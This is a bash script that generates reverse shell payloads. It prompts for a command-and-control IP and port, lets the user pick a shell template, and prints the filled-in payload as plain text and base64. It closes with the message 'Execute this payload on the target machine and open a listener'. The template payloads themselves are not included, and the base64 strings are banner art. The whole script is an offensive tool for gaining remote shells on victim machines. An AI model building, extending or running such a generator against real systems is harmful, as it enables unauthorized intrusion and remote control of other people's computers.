#!/bin/bash 

GR='\033[0;32m'
RE='\033[0;31m'
OR='\033[0;33m'
NC='\033[0m'


function b() {
	bb="ICAgLnRAQEBAQEBYQEBAQEBAQFhAQEBAQEBAWEBAQEBAQEB0IC4gIAogLlguUzt0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dEA6UyAgCiBTOCB0QDhTJVggO0AlOC46Ojo6Ojo6Ojo6Ojo6Ojo6OjouLiA4JSAKIFhALjg4OEAgLiUlJVN0IC4gLi4uLi4uLi4uLi4uLi4uLiAgIEBAIAogQFguLlN0O3RAOzt0WC4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uQEAgCiBAOCBYQFNYWEBYWFhAQEBAWEBYQFhAWEBYQFhAWEBYQFhYWC44QCAKIEA4JSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC4gJThAIAogQDglIC4gLjo4QEB0LiAgLiAuICAuICAuICAuICAuICAuICAlOFggCiBAOCUgICAgIEA6Ljh0Oy4gICAgICAuICAgICAgLiAgICAgLiU4QCAKIEA4JSAgLiAgLjo4OiAgdCAgLiAuICAgIC4gLiAgIC4gICAgJThYLgogQDglICAgIC4gIC47WC5AOjogICAgIC4gICAgICAgICAuICAlOEAgCiBAOCUgIC4gICAgIC47QCA4WCAgIC4gICAuICAuIC4gICAuICU4WCAKIEA4JSAgICAgLiAuJTouOzggIC4gICAgICAgICAgICAuICAgJThAIAogQDglIC4gIC4gOCA6QDhTIDo4QEBAQFhAQFhAUyAuICAgIC4lOEAgCiBAOCUgICAgOjt0ODhTICAgUzo4QEBAQEBAQEAgICAgIC4gICU4WCAKIEA4dCAgLiAgLjogICAgIC4gLiAgLiAgICAuICAgLiAgICAgdDhAIAogOzs6ODouLjouLjouOi46Li46LjouLjouOi4uOi4uOi46OjgudFMgCiAuU3QgQDhAOEA4QDhAOEA4QDhAOEA4QDhAOEA4QDhAOEA4QDhACgo="

	v="IBtbMDsxOzM1Ozk1beKjjxtbMDsxOzMxOzkxbeKhsRtbMG0gG1swOzE7MzM7OTNt4qKA4qGAG1swbSAbWzA7MTszMjs5Mm3ioYAbWzA7MTszNjs5Nm3iooAbWzBtIBtbMDsxOzM0Ozk0beKigOKhgBtbMG0gG1swOzE7MzU7OTVt4qGAG1swOzE7MzE7OTFt4qOAG1swbSAbWzA7MTszMzs5M23iooDio4AbWzBtIBtbMDsxOzMyOzkybeKigBtbMDsxOzM2Ozk2beKhgBtbMG0gICAbWzA7MTszNTs5NW3ioo7ioZEbWzBtIBtbMDsxOzMxOzkxbeKjhxtbMDsxOzMzOzkzbeKhgBtbMG0gG1swOzE7MzI7OTJt4qKA4qGAG1swbSAbWzA7MTszNjs5Nm3ioYcbWzBtIBtbMDsxOzM0Ozk0beKhhxtbMG0gICAbWzA7MTszMTs5MW3io48bWzA7MTszMzs5M23ioYkbWzBtIBtbMDsxOzMyOzkybeKjgOKhgBtbMG0gG1swOzE7MzY7OTZt4qKAG1swOzE7MzQ7OTRt4qGAG1swbSAbWzA7MTszNTs5NW3ioIQbWzBtIBtbMDsxOzMxOzkxbeKjgOKhgBtbMG0gG1swOzE7MzM7OTNt4qKAG1swOzE7MzI7OTJt4qGAG1swbSAgIBtbMDsxOzM0Ozk0beKhgOKigBtbMG0gG1swOzE7MzU7OTVt4qOOG1swOzE7MzE7OTFt4qO1G1swbSAgIBtbMDsxOzMyOzkybeKih+KjuBtbMG0gICAbWzA7MTszNDs5NG3iorobWzBtIAogG1swOzE7MzE7OTFt4qCHG1swOzE7MzM7OTNt4qCxG1swbSAbWzA7MTszMjs5Mm3ioKPioK0bWzBtIBtbMDsxOzM2Ozk2beKgsRtbMDsxOzM0Ozk0beKggxtbMG0gG1swOzE7MzU7OTVt4qCj4qCtG1swbSAbWzA7MTszMTs5MW3ioI8bWzBtICAbWzA7MTszMjs5Mm3ioK3ioJUbWzBtIBtbMDsxOzM2Ozk2beKgoxtbMDsxOzM0Ozk0beKgrRtbMG0gICAbWzA7MTszMTs5MW3ioKLioJwbWzBtIBtbMDsxOzMzOzkzbeKghxtbMDsxOzMyOzkybeKguBtbMG0gG1swOzE7MzY7OTZt4qCj4qCtG1swbSAbWzA7MTszNDs5NG3ioKMbWzBtIBtbMDsxOzM1Ozk1beKgoxtbMG0gICAbWzA7MTszMzs5M23ioKcbWzA7MTszMjs5Mm3ioKQbWzBtIBtbMDsxOzM2Ozk2beKgh+KguBtbMG0gG1swOzE7MzQ7OTRt4qORG1swOzE7MzU7OTVt4qG6G1swbSAbWzA7MTszMTs5MW3ioIcbWzBtIBtbMDsxOzMzOzkzbeKgh+KguBtbMG0gG1swOzE7MzI7OTJt4qCjG1swOzE7MzY7OTZt4qCtG1swbSAgIBtbMDsxOzM1Ozk1beKgseKggxtbMG0gG1swOzE7MzE7OTFt4qCrG1swOzE7MzM7OTNt4qCcG1swbSAbWzA7MTszMjs5Mm3ioLYbWzBtICAbWzA7MTszNjs5Nm3ioLgbWzBtIBtbMDsxOzM0Ozk0beKgthtbMG0gG1swOzE7MzU7OTVt4qC8G1swOzE7MzE7OTFt4qCEG1swbQo="
	clear ; echo $bb |base64 -d ; echo $v | base64 -d ; echo " · ·----------------------------------------------· ·" | echo ""
}

function rebuild_index() {
	find tpl -type f -iname '*.tpl' | cut -d"/" -f2 | sed "s|.tpl$||" | sort > tpl/index
}



function get_tpl() {
	TPL_FILE=$1
	SERVER_IP=$2
	PORT=$3

	echo ""
	echo -e "${GR}>> Generating reverse shell [ ${TPL_FILE} ] ............ [OK]${NC}"
	echo ""

	# plain text version
	echo -e "${GR}>> Plain text version: ${NC}"
	cat tpl/${TPL_FILE}.tpl | sed "s|XX_CC_SERVER_IP|${SERVER_IP}|" | sed "s|XX_PORT|${PORT}|"
	echo ""
	# b64 encoded version
	echo -e "${GR}>> Base64 encoded version: ${NC}"
	cat tpl/${TPL_FILE}.tpl | sed "s|XX_CC_SERVER_IP|${SERVER_IP}|" | sed "s|XX_PORT|${PORT}|"|base64
	echo ""

	echo -e "${GR}>> Execute this payload on the target machine and open a listener on the IP you're selected and you're all set.${NC}"
	echo -e "${GR}>> Enjoy! Thanks for playing! =)${NC}"
	
}

function generate() {
	TPL_NAME=$1
	CC_SERVER_IP=$2
	PORT=$3

	get_tpl ${TPL_NAME} ${CC_SERVER_IP} ${PORT}
}

function check_ip() {
	local ip="$1"
    local ip_pattern="^([0-9]{1,3}\.){3}[0-9]{1,3}$"

    if [[ $ip =~ $ip_pattern ]]; then
        IFS='.' read -ra ip_parts <<< "$ip"

        if [ ${#ip_parts[@]} -eq 4 ]; then
            for part in "${ip_parts[@]}"; do
                if ! [[ "$part" =~ ^[0-9]+$ ]] || ((part < 0 || part > 255)); then
					echo -e "${RE}>> [ERR]: Invalid IP addr${NC}"
                    return 1  
					exit 2
                fi
            done
            return 0  
        fi
    fi

	echo -e "${RE}>> [ERR]: Invalid IP addr${NC}"
	exit 1
	
}


function check_port() {

 	local ip_port="$1"

	if [ ${ip_port} == "0" -o ${ip_port} -gt 65535 ]; then 
		echo -e "${RE}>> ERR: Incorrect port${NC}"
		exit 3
	fi

}

function selector() {
	echo -n -e "${GR}>> Type IPv4 address to connect: ${NC}"
	read ip_addr
	check_ip ${ip_addr}
	echo -n -e "${GR}>> Now the TCP port to connect: ${NC}" 
	read tcp_port
	check_port ${tcp_port}
	TPL=$(cat tpl/index | percol --prompt ">>> Select a reverse shell type to generate")
	generate ${TPL} ${ip_addr} ${tcp_port}
	
}

b
rebuild_index
selector
